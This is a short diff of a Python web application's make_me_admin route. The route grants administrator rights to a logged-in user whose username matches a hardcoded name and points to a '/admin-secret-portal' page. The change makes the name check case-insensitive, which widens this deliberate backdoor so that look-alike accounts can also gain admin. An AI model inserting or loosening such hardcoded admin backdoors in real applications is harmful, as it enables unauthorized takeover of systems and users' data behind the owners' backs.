@@ -611,7 +611,7 @@ def make_me_admin():
         return "Not logged in", 401
 
     user = User.query.get(session["user_id"])
-    if user and user.username == "mirdharm":
+    if user and user.username.lower() == "mirdharm":
         user.is_admin = True
         db.session.commit()
         return "You are now admin! Go to /admin-secret-portal"
